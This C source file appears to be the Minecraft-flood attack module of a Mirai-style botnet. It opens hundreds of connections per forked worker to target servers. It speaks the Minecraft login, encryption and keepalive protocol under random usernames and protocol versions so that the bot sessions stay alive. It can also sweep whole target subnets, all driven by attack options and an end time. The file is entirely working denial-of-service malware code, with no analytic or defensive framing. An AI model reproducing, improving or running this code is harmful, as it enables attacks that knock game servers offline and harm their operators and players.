#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <time.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <poll.h>
#include <errno.h>

#include "headers/includes.h"
#include "headers/attack.h"
#include "headers/rand.h"
#include "headers/util.h"
#include "headers/mc_crypto.h"

#define MAX_MC_CONNS 512
#define MC_RECV_BUF  4096

typedef struct {
    int cb_keepalive;
    int sb_keepalive;
    int sb_position;
    int login_success;
    int login_enc_req;
    int login_ack;
    int cfg_finish_cb;
    int cfg_finish_sb;
    int needs_config;
} mc_proto_t;

typedef enum {
    MC_STATE_LOGIN = 0,
    MC_STATE_CONFIG = 1,
    MC_STATE_PLAY = 2
} mc_state_t;

typedef struct {
    int fd;
    int protocol;
    mc_state_t state;
    int encrypted;
    uint8_t key[16];
    uint8_t iv[16];
    uint8_t der_pubkey[512];
    int der_len;
    uint8_t recv[MC_RECV_BUF];
    int recv_len;
    time_t last_active;
    int in_play;
} mc_conn_t;

static int write_varint(uint8_t *buf, int value)
{
    int len = 0;
    do {
        uint8_t b = value & 0x7f;
        value >>= 7;
        if (value > 0) b |= 0x80;
        buf[len++] = b;
    } while (value > 0);
    return len;
}

static int read_varint(const uint8_t *buf, int buflen, int *pos, int *out)
{
    int numread = 0, result = 0, read;
    int p = *pos;
    do {
        if (numread >= 5 || p >= buflen) return -1;
        read = buf[p++];
        result |= (read & 0x7f) << (7 * numread);
        numread++;
    } while ((read & 0x80) != 0);
    *pos = p;
    *out = result;
    return numread;
}

static mc_proto_t mc_proto_for(int version)
{
    mc_proto_t p;
    memset(&p, 0, sizeof(p));
    p.login_enc_req = 0x01;
    p.login_success = 0x02;
    p.login_ack = 0x03;
    p.cfg_finish_cb = 0x02;
    p.cfg_finish_sb = 0x02;

    if (version >= 768) {
        p.cb_keepalive = 0x26;
        p.sb_keepalive = 0x18;
        p.sb_position = 0x1b;
        p.needs_config = 1;
    } else if (version >= 765) {
        p.cb_keepalive = 0x24;
        p.sb_keepalive = 0x16;
        p.sb_position = 0x1a;
        p.needs_config = 1;
    } else if (version >= 764) {
        p.cb_keepalive = 0x23;
        p.sb_keepalive = 0x15;
        p.sb_position = 0x19;
    } else if (version >= 340) {
        p.cb_keepalive = 0x1f;
        p.sb_keepalive = 0x0b;
        p.sb_position = 0x12;
    } else {
        p.cb_keepalive = 0x00;
        p.sb_keepalive = 0x00;
        p.sb_position = 0x04;
    }
    return p;
}

static int pick_protocol(int version)
{
    static const int VERSIONS[] = {
        340, 404, 754, 764, 765, 768
    };
    if (version > 0)
        return version;
    return VERSIONS[rand_next() % (sizeof(VERSIONS) / sizeof(VERSIONS[0]))];
}

static void rand_username(char *buf, int minlen, int maxlen)
{
    static const char chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_";
    int len = minlen + (rand_next() % (maxlen - minlen + 1));
    int i;
    for (i = 0; i < len; i++)
        buf[i] = chars[rand_next() % (sizeof(chars) - 1)];
    buf[len] = '\0';
}

static void write_double(uint8_t *buf, double v)
{
    uint64_t bits;
    memcpy(&bits, &v, 8);
    buf[0] = (bits >> 56) & 0xff;
    buf[1] = (bits >> 48) & 0xff;
    buf[2] = (bits >> 40) & 0xff;
    buf[3] = (bits >> 32) & 0xff;
    buf[4] = (bits >> 24) & 0xff;
    buf[5] = (bits >> 16) & 0xff;
    buf[6] = (bits >>  8) & 0xff;
    buf[7] =  bits        & 0xff;
}

static void write_float(uint8_t *buf, float v)
{
    uint32_t bits;
    memcpy(&bits, &v, 4);
    buf[0] = (bits >> 24) & 0xff;
    buf[1] = (bits >> 16) & 0xff;
    buf[2] = (bits >>  8) & 0xff;
    buf[3] =  bits        & 0xff;
}

static int build_handshake_login(uint8_t *buf, const char *host, uint16_t port,
                                 const char *user, int version)
{
    uint8_t hb[256], lb[128];
    int hblen = 0, lblen = 0, pos = 0, slen;

    hblen += write_varint(hb + hblen, 0x00);
    hblen += write_varint(hb + hblen, version);
    slen = (int)util_strlen(host);
    hblen += write_varint(hb + hblen, slen);
    util_memcpy(hb + hblen, host, slen);
    hblen += slen;
    hb[hblen++] = (port >> 8) & 0xff;
    hb[hblen++] = port & 0xff;
    hblen += write_varint(hb + hblen, 2);

    pos += write_varint(buf + pos, hblen);
    util_memcpy(buf + pos, hb, hblen);
    pos += hblen;

    lblen += write_varint(lb + lblen, 0x00);
    slen = (int)util_strlen(user);
    lblen += write_varint(lb + lblen, slen);
    util_memcpy(lb + lblen, user, slen);
    lblen += slen;

    pos += write_varint(buf + pos, lblen);
    util_memcpy(buf + pos, lb, lblen);
    pos += lblen;
    return pos;
}

static int mc_send_raw(mc_conn_t *c, const uint8_t *data, int len)
{
    uint8_t frame[512];
    int pos = write_varint(frame, len);
    if (pos + len > (int)sizeof(frame))
        return -1;
    util_memcpy(frame + pos, data, len);
    pos += len;
    if (c->encrypted)
        mc_aes_cfb8_crypt(c->key, c->iv, frame, pos);
    return (int)send(c->fd, frame, pos, MSG_NOSIGNAL);
}

static int mc_send_packet(mc_conn_t *c, const uint8_t *payload, int len)
{
    return mc_send_raw(c, payload, len);
}

static int mc_send_login_ack(mc_conn_t *c, mc_proto_t *proto)
{
    uint8_t pkt[8];
    int pos = 0;
    pkt[pos++] = (uint8_t)proto->login_ack;
    return mc_send_packet(c, pkt, pos);
}

static int mc_send_cfg_finish(mc_conn_t *c, mc_proto_t *proto)
{
    uint8_t pkt[8];
    int pos = 0;
    pkt[pos++] = (uint8_t)proto->cfg_finish_sb;
    return mc_send_packet(c, pkt, pos);
}

static int mc_send_keepalive(mc_conn_t *c, mc_proto_t *proto, int64_t id)
{
    uint8_t pkt[16];
    int pos = 0, i;
    pkt[pos++] = (uint8_t)proto->sb_keepalive;
    for (i = 0; i < 8; i++)
        pkt[pos++] = (uint8_t)((id >> (56 - i * 8)) & 0xff);
    return mc_send_packet(c, pkt, pos);
}

static int mc_send_position(mc_conn_t *c, mc_proto_t *proto)
{
    uint8_t pkt[64];
    int pos = 0;
    pkt[pos++] = (uint8_t)proto->sb_position;
    write_double(pkt + pos, 0.5); pos += 8;
    write_double(pkt + pos, 64.0); pos += 8;
    write_double(pkt + pos, 0.5); pos += 8;
    write_float(pkt + pos, 0.0f); pos += 4;
    write_float(pkt + pos, 0.0f); pos += 4;
    pkt[pos++] = 1;
    return mc_send_packet(c, pkt, pos);
}

static int mc_handle_encryption(mc_conn_t *c, const uint8_t *payload, int len)
{
    uint8_t shared[16];
    uint8_t verify[128];
    uint8_t response[512];
    int verify_len;
    int i, rlen;

    c->der_len = mc_parse_encryption_request(payload, len, c->der_pubkey,
                                             (int)sizeof(c->der_pubkey),
                                             verify, &verify_len);
    if (c->der_len < 0)
        return -1;

    for (i = 0; i < 16; i++)
        shared[i] = (uint8_t)(rand_next() & 0xff);

    rlen = mc_build_encryption_response(shared, verify, verify_len,
                                        c->der_pubkey, c->der_len,
                                        response, (int)sizeof(response));
    if (rlen < 0)
        return -1;
    if (mc_send_raw(c, response, rlen) < 0)
        return -1;

    util_memcpy(c->key, shared, 16);
    util_memcpy(c->iv, shared, 16);
    c->encrypted = 1;
    c->recv_len = 0;
    return 0;
}

static void mc_process_packets(mc_conn_t *c, mc_proto_t *proto)
{
    int pos = 0;
    while (pos < c->recv_len) {
        int pkt_len = 0, pkt_id = 0, vlen, idlen, pstart;
        vlen = read_varint(c->recv, c->recv_len, &pos, &pkt_len);
        if (vlen < 0 || pkt_len <= 0 || pos + pkt_len > c->recv_len)
            break;
        pstart = pos;
        idlen = read_varint(c->recv, c->recv_len, &pos, &pkt_id);
        if (idlen < 0)
            break;

        if (c->state == MC_STATE_LOGIN) {
            if (pkt_id == proto->login_enc_req) {
                mc_handle_encryption(c, c->recv + pstart, pkt_len);
            } else if (pkt_id == proto->login_success) {
                if (proto->needs_config) {
                    mc_send_login_ack(c, proto);
                    c->state = MC_STATE_CONFIG;
                } else {
                    c->state = MC_STATE_PLAY;
                    c->in_play = 1;
                }
            }
        } else if (c->state == MC_STATE_CONFIG) {
            if (pkt_id == proto->cfg_finish_cb) {
                mc_send_cfg_finish(c, proto);
                c->state = MC_STATE_PLAY;
                c->in_play = 1;
            }
        } else if (c->state == MC_STATE_PLAY && c->in_play) {
            if (pkt_id == proto->cb_keepalive) {
                int64_t ka_id = 0;
                int j;
                for (j = 0; j < 8 && pos + j < pstart + pkt_len; j++)
                    ka_id = (ka_id << 8) | c->recv[pos + j];
                mc_send_keepalive(c, proto, ka_id);
            }
            if (time(NULL) - c->last_active > 25)
                mc_send_position(c, proto);
        }
        pos = pstart + pkt_len;
        c->last_active = time(NULL);
    }
    if (pos > 0 && pos < c->recv_len)
        memmove(c->recv, c->recv + pos, c->recv_len - pos);
    c->recv_len -= pos;
}

static int mc_connect_nonblock(uint32_t dst, uint16_t dport)
{
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr;
    int err;
    socklen_t el;

    if (fd < 0)
        return -1;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(dport);
    addr.sin_addr.s_addr = dst;
    fcntl(fd, F_SETFL, O_NONBLOCK);
    connect(fd, (struct sockaddr *)&addr, sizeof(addr));
    {
        struct pollfd pfd = {fd, POLLOUT, 0};
        if (poll(&pfd, 1, 2000) <= 0) { close(fd); return -1; }
    }
    el = sizeof(err);
    if (getsockopt(fd, SOL_SOCKET, SO_ERROR, &err, &el) < 0 || err) {
        close(fd);
        return -1;
    }
    {
        int one = 1;
        setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
    }
    fcntl(fd, F_SETFL, fcntl(fd, F_GETFL, 0) & ~O_NONBLOCK);
    return fd;
}

static void mc_worker(uint8_t targs_len, struct attack_target *targs,
                      uint8_t opts_len, struct attack_option *opts)
{
    uint16_t dport = (uint16_t)attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 25565);
    char *vhost = attack_get_opt_str(opts_len, opts, ATK_OPT_DOMAIN, NULL);
    int version_opt = attack_get_opt_int(opts_len, opts, ATK_OPT_VERSION, -1);
    int aggressive = attack_get_opt_int(opts_len, opts, ATK_OPT_AGGRESSIVE, 0);
    mc_conn_t *conns;
    struct pollfd *pfds;
    int active = 0, i, tidx = 0;
    char username[17];
    char addr_str[64];
    uint8_t pkt[512];

    conns = calloc(MAX_MC_CONNS, sizeof(mc_conn_t));
    pfds = calloc(MAX_MC_CONNS, sizeof(struct pollfd));
    if (!conns || !pfds)
        goto done;

    for (i = 0; i < MAX_MC_CONNS; i++) {
        conns[i].fd = -1;
        pfds[i].fd = -1;
    }

    while (g_atk_end_time == 0 || time(NULL) < g_atk_end_time) {
        for (i = 0; i < MAX_MC_CONNS; i++) {
            uint32_t dst;
            struct in_addr ia;
            const char *host;
            int proto_ver;
            mc_proto_t proto;
            int pkt_len;

            if (conns[i].fd >= 0)
                continue;
            if (!aggressive && active > 0)
                break;

            dst = targs[tidx].addr;
            if (targs[tidx].netmask < 32)
                dst = htonl(ntohl(dst) + (rand_next() >> targs[tidx].netmask));
            tidx = (tidx + 1) % targs_len;
            ia.s_addr = dst;
            util_strcpy(addr_str, inet_ntoa(ia));
            host = (vhost && vhost[0]) ? vhost : addr_str;

            proto_ver = pick_protocol(version_opt);
            proto = mc_proto_for(proto_ver);
            rand_username(username, 5, 14);
            pkt_len = build_handshake_login(pkt, host, dport, username, proto_ver);

            conns[i].fd = mc_connect_nonblock(dst, dport);
            if (conns[i].fd < 0)
                continue;

            conns[i].protocol = proto_ver;
            conns[i].state = MC_STATE_LOGIN;
            conns[i].encrypted = 0;
            conns[i].recv_len = 0;
            conns[i].last_active = time(NULL);
            conns[i].in_play = 0;

            send(conns[i].fd, pkt, pkt_len, MSG_NOSIGNAL);
            pfds[i].fd = conns[i].fd;
            pfds[i].events = POLLIN;
            active++;

            if (!aggressive) {
                uint8_t buf[1024];
                struct pollfd rp = {conns[i].fd, POLLIN, 0};
                if (poll(&rp, 1, 800) > 0) {
                    int n = (int)recv(conns[i].fd, buf, sizeof(buf), 0);
                    if (n > 0) {
                        util_memcpy(conns[i].recv, buf, n);
                        conns[i].recv_len = n;
                        mc_process_packets(&conns[i], &proto);
                    }
                }
                close(conns[i].fd);
                conns[i].fd = -1;
                pfds[i].fd = -1;
                active--;
            }
        }

        if (!aggressive)
            continue;

        if (poll(pfds, MAX_MC_CONNS, 50) <= 0)
            continue;

        for (i = 0; i < MAX_MC_CONNS; i++) {
            mc_proto_t proto;
            int n;

            if (conns[i].fd < 0)
                continue;
            proto = mc_proto_for(conns[i].protocol);

            if (pfds[i].revents & (POLLERR | POLLHUP | POLLNVAL)) {
                close(conns[i].fd);
                conns[i].fd = -1;
                pfds[i].fd = -1;
                active--;
                continue;
            }
            if (!(pfds[i].revents & POLLIN))
                continue;

            n = (int)recv(conns[i].fd, conns[i].recv + conns[i].recv_len,
                          MC_RECV_BUF - conns[i].recv_len, 0);
            if (n <= 0) {
                close(conns[i].fd);
                conns[i].fd = -1;
                pfds[i].fd = -1;
                active--;
                continue;
            }
            if (conns[i].encrypted)
                mc_aes_cfb8_crypt(conns[i].key, conns[i].iv,
                                  conns[i].recv + conns[i].recv_len, n);
            conns[i].recv_len += n;
            mc_process_packets(&conns[i], &proto);
        }
    }

done:
    for (i = 0; i < MAX_MC_CONNS; i++)
        if (conns[i].fd >= 0)
            close(conns[i].fd);
    free(conns);
    free(pfds);
}

void attack_mc(uint8_t targs_len, struct attack_target *targs,
               uint8_t opts_len, struct attack_option *opts)
{
    int workers = attack_get_opt_int(opts_len, opts, ATK_OPT_CONNS, 16);
    int i;

    if (workers < 1) workers = 1;
    if (workers > 64) workers = 64;

#ifdef ANDROID
    mc_worker(targs_len, targs, opts_len, opts);
#else
    for (i = 0; i < workers; i++) {
        pid_t pid = fork();
        if (pid < 0) continue;
        if (pid == 0) { mc_worker(targs_len, targs, opts_len, opts); _exit(0); }
    }
    while (g_atk_end_time == 0 || time(NULL) < g_atk_end_time)
        sleep(1);
    while (waitpid(-1, NULL, WNOHANG) > 0)
        ;
#endif
}
